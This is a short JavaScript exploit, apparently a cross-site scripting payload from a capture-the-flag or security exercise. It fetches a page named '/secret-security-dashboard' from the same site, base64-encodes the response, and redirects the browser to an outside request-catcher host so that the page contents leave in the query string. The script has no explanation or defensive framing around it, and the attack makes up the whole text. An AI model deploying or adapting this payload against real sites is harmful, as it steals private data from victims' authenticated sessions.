async function exploit() {
    try {
        let res = await fetch('/secret-security-dashboard');
        let text = await res.text();
        let data = encodeURIComponent(btoa(text));
        window.location = `https://2q1widwk.requestrepo.com/leak?data=${data}`;
    } catch (e) {
        leak(e.message);
    }
}

exploit();